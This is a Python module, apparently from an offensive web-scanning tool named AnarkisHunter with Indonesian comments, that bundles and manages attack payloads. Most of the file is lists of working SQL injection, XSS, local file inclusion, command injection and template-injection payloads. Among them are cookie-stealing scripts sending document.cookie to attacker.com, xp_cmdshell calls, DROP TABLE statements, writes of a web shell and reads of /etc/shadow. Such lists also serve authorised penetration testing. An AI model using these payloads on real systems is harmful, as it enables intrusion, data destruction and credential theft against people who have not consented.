"""
AnarkisHunter — utils_payload.py
===================================
Payload library manager.
Load, filter, search, dan manage payload untuk berbagai serangan.

Usage standalone:
    python modules/utils/utils_payload.py --list sqli
    python modules/utils/utils_payload.py --search "UNION" --type sqli
"""

import sys
import re
from pathlib import Path
from typing import List, Optional, Dict

sys.path.insert(0, str(Path(__file__).resolve().parents[2]))
from config.settings import PAYLOAD_SQLI, PAYLOAD_XSS, PAYLOAD_LFI, PAYLOAD_CMD


# ─── Built-in Payload Collections ────────────────────────────────────────────

SQLI_PAYLOADS_BUILTIN = [
    # Error-based
    "'", "''", "`", "``", ",", "\"", "\"\"", "/", "//", "\\", "//\\",
    "'--", "'#", "' --", "' #", "'/*",
    "1' OR '1'='1",
    "1' OR '1'='1'--",
    "1' OR '1'='1'#",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "' OR 'x'='x",
    "\" OR \"x\"=\"x",
    "') OR ('x')=('x",
    "')) OR (('x'))=(('x",
    # Boolean-based
    "' AND 1=1--",
    "' AND 1=2--",
    "1 AND 1=1",
    "1 AND 1=2",
    "1' AND '1'='1",
    "1' AND '1'='2",
    # Time-based
    "'; WAITFOR DELAY '0:0:5'--",
    "'; SLEEP(5)--",
    "1; SLEEP(5)",
    "1' AND SLEEP(5)--",
    "1 AND SLEEP(5)",
    "'; SELECT SLEEP(5)--",
    "1 WAITFOR DELAY '0:0:5'",
    "'; SELECT pg_sleep(5)--",
    # UNION-based
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION ALL SELECT NULL--",
    "' UNION SELECT 1,2,3--",
    "' UNION SELECT 1,user(),3--",
    "' UNION SELECT 1,database(),3--",
    "' UNION SELECT 1,version(),3--",
    "' UNION SELECT 1,@@version,3--",
    "' UNION SELECT table_name,NULL FROM information_schema.tables--",
    "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--",
    # Stacked queries
    "'; DROP TABLE users--",
    "'; INSERT INTO users VALUES('hacker','hacker@evil.com','hacked')--",
    "1; UPDATE users SET password='hacked' WHERE '1'='1",
    # Out of band
    "'; EXEC xp_cmdshell('ping attacker.com')--",
    "' AND LOAD_FILE('/etc/passwd')--",
    "' INTO OUTFILE '/var/www/html/shell.php'--",
    # NoSQL
    "{'$ne': null}",
    "{'$gt': ''}",
    "{'$where': 'sleep(1000)'}",
    '{"$gt": ""}',
]

XSS_PAYLOADS_BUILTIN = [
    # Basic
    "<script>alert(1)</script>",
    "<script>alert('XSS')</script>",
    "<script>alert(document.domain)</script>",
    "<script>alert(document.cookie)</script>",
    # Tag variants
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert(1)>",
    "<svg><script>alert(1)</script></svg>",
    "<body onload=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<select onchange=alert(1)><option>1</option></select>",
    "<iframe src='javascript:alert(1)'>",
    "<iframe onload=alert(1) src=x>",
    # Event handlers
    "<div onmouseover=alert(1)>Hover me</div>",
    "<a href='javascript:alert(1)'>Click me</a>",
    "<button onclick=alert(1)>Click</button>",
    "<details open ontoggle=alert(1)>",
    "<video src=x onerror=alert(1)>",
    "<audio src=x onerror=alert(1)>",
    # WAF bypass
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<script>alert`1`</script>",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "<<script>alert(1);//<</script>",
    "<script>eval('ale'+'rt(1)')</script>",
    "javascript:alert(1)",
    "JaVaScRiPt:alert(1)",
    "&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert(1)",
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">",
    # DOM XSS
    "'-alert(1)-'",
    "\"-alert(1)-\"",
    "';alert(1);//",
    # Template injection combined
    "{{7*7}}<script>alert(1)</script>",
    # Stored XSS
    "<script>fetch('http://attacker.com/?c='+document.cookie)</script>",
    "<script>new Image().src='http://attacker.com/?c='+document.cookie</script>",
]

LFI_PAYLOADS_BUILTIN = [
    # Linux
    "../etc/passwd",
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "../../../../../../../etc/passwd",
    "../../../../../../../../etc/passwd",
    # Windows
    "..\\windows\\win.ini",
    "..\\..\\windows\\win.ini",
    "..\\..\\..\\windows\\win.ini",
    "../../../../windows/win.ini",
    "../../../../../windows/win.ini",
    # Null byte (older PHP)
    "../../../etc/passwd%00",
    "../../../../etc/passwd%00",
    "../../../etc/passwd\x00",
    # URL encoded
    "%2e%2e%2fetc%2fpasswd",
    "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "%252e%252e%252fetc%252fpasswd",
    # Double encoding
    "..%2F..%2F..%2Fetc%2Fpasswd",
    # PHP wrappers
    "php://filter/convert.base64-encode/resource=../../../etc/passwd",
    "php://filter/read=convert.base64-encode/resource=index.php",
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "php://input",
    "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
    "expect://id",
    # Interesting files
    "../../../etc/shadow",
    "../../../etc/hosts",
    "../../../etc/hostname",
    "../../../etc/issue",
    "../../../proc/self/environ",
    "../../../proc/self/cmdline",
    "../../../var/log/apache2/access.log",
    "../../../var/log/apache/access.log",
    "../../../var/log/nginx/access.log",
    "../../../var/log/auth.log",
    # Windows files
    "../../../../windows/system32/drivers/etc/hosts",
    "../../../../boot.ini",
    "../../../../windows/php.ini",
]

CMD_PAYLOADS_BUILTIN = [
    # Linux
    "; id",
    "| id",
    "|| id",
    "&& id",
    "& id",
    "; whoami",
    "| whoami",
    "|| whoami",
    "&& whoami",
    "; ls -la",
    "| ls -la",
    "|| ls",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "| cat /etc/hosts",
    "; uname -a",
    "| uname -a",
    "; pwd",
    "| pwd",
    "` id`",
    "$(id)",
    "$(whoami)",
    # Time-based
    "; sleep 5",
    "| sleep 5",
    "&& sleep 5",
    "; ping -c 5 127.0.0.1",
    # Windows
    "& dir",
    "| dir",
    "&& dir",
    "& whoami",
    "| whoami",
    "&& whoami",
    "& ipconfig",
    "| ipconfig",
    "& type C:\\windows\\win.ini",
    "| type C:\\boot.ini",
    # Encoded
    "%3B id",
    "%7C id",
    "%26%26 id",
    "%0a id",
    "%0d%0a id",
]

SSTI_PAYLOADS_BUILTIN = [
    # Detection
    "{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>", "${7*'7'}",
    "{{7*'7'}}", "{{config}}", "{{self}}", "{{request}}",
    # Jinja2 RCE
    "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
    "{{'%s'%7}}", "{{[].__class__.__mro__[1].__subclasses__()}}",
    "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
    # Twig
    "{{7*7}}", "{{dump(app)}}", "{{app.request.server.all|join(',')}}", 
    "{{ '/etc/passwd'|file_excerpt(1,30) }}",
    # Freemarker
    "${7*7}", "<#assign ex = 'freemarker.template.utility.Execute'?new()>${ex('id')}",
    # Velocity
    "#set($x='')##$x.class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke($x.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')",
    # Smarty
    "{php}echo `id`;{/php}", "{if system('id')}{/if}",
    # Pebble
    "{{ someString.toUPPERCASE() }}",
]


class PayloadManager:
    """Manage dan load payload dari file atau built-in collection."""

    def __init__(self):
        self._payloads: Dict[str, List[str]] = {
            "sqli": SQLI_PAYLOADS_BUILTIN.copy(),
            "xss": XSS_PAYLOADS_BUILTIN.copy(),
            "lfi": LFI_PAYLOADS_BUILTIN.copy(),
            "cmd": CMD_PAYLOADS_BUILTIN.copy(),
            "ssti": SSTI_PAYLOADS_BUILTIN.copy(),
        }
        # Load dari file jika ada
        self._load_from_files()

    def _load_from_files(self):
        """Load payload dari file wordlist."""
        file_map = {
            "sqli": PAYLOAD_SQLI,
            "xss": PAYLOAD_XSS,
            "lfi": PAYLOAD_LFI,
            "cmd": PAYLOAD_CMD,
        }
        for ptype, filepath in file_map.items():
            if Path(filepath).exists():
                try:
                    lines = Path(filepath).read_text(encoding="utf-8", errors="replace").splitlines()
                    file_payloads = [l.strip() for l in lines if l.strip() and not l.startswith("#")]
                    # Merge dengan built-in, hindari duplikasi
                    existing = set(self._payloads[ptype])
                    new_payloads = [p for p in file_payloads if p not in existing]
                    self._payloads[ptype].extend(new_payloads)
                except Exception:
                    pass

    def get(self, payload_type: str, limit: Optional[int] = None) -> List[str]:
        """
        Get payloads berdasarkan tipe.
        
        Args:
            payload_type: 'sqli', 'xss', 'lfi', 'cmd', 'ssti'
            limit: Batasi jumlah payload
        """
        payloads = self._payloads.get(payload_type.lower(), [])
        if limit:
            return payloads[:limit]
        return payloads

    def get_from_file(self, filepath: str) -> List[str]:
        """Load payload dari file custom."""
        try:
            lines = Path(filepath).read_text(encoding="utf-8", errors="replace").splitlines()
            return [l.strip() for l in lines if l.strip() and not l.startswith("#")]
        except Exception as e:
            return []

    def search(self, keyword: str, payload_type: Optional[str] = None) -> List[Dict]:
        """Cari payload berdasarkan keyword."""
        results = []
        types = [payload_type] if payload_type else list(self._payloads.keys())
        for ptype in types:
            for payload in self._payloads.get(ptype, []):
                if keyword.lower() in payload.lower():
                    results.append({"type": ptype, "payload": payload})
        return results

    def add(self, payload_type: str, payload: str) -> None:
        """Tambahkan payload baru."""
        if payload_type not in self._payloads:
            self._payloads[payload_type] = []
        if payload not in self._payloads[payload_type]:
            self._payloads[payload_type].append(payload)

    def count(self, payload_type: str) -> int:
        """Hitung jumlah payload untuk tipe tertentu."""
        return len(self._payloads.get(payload_type.lower(), []))

    def all_types(self) -> List[str]:
        """Return semua tipe payload yang tersedia."""
        return list(self._payloads.keys())


# Global instance
payload_manager = PayloadManager()


# ─── Standalone ──────────────────────────────────────────────────────────────

if __name__ == "__main__":
    import argparse
    from rich.console import Console
    from rich.table import Table

    console = Console()
    parser = argparse.ArgumentParser(description="Payload Manager")
    parser.add_argument("--list", choices=["sqli", "xss", "lfi", "cmd", "ssti", "all"], help="List payloads")
    parser.add_argument("--search", help="Search keyword in payloads")
    parser.add_argument("--type", help="Filter by payload type")
    parser.add_argument("--count", action="store_true", help="Show payload counts")
    args = parser.parse_args()

    pm = PayloadManager()

    if args.count:
        table = Table(title="Payload Library Stats", border_style="cyan")
        table.add_column("Type", style="cyan")
        table.add_column("Count", style="green")
        for t in pm.all_types():
            table.add_row(t.upper(), str(pm.count(t)))
        console.print(table)

    elif args.list:
        types = pm.all_types() if args.list == "all" else [args.list]
        for t in types:
            payloads = pm.get(t)
            table = Table(title=f"{t.upper()} Payloads ({len(payloads)} total)", border_style="red")
            table.add_column("#", style="dim", width=5)
            table.add_column("Payload", style="yellow")
            for i, p in enumerate(payloads[:50], 1):  # Show max 50
                table.add_row(str(i), p)
            console.print(table)

    elif args.search:
        results = pm.search(args.search, args.type)
        table = Table(title=f"Search results for '{args.search}'", border_style="green")
        table.add_column("Type", style="cyan")
        table.add_column("Payload", style="yellow")
        for r in results[:30]:
            table.add_row(r["type"].upper(), r["payload"])
        console.print(table)
        console.print(f"\nTotal: [green]{len(results)}[/green] results\n")
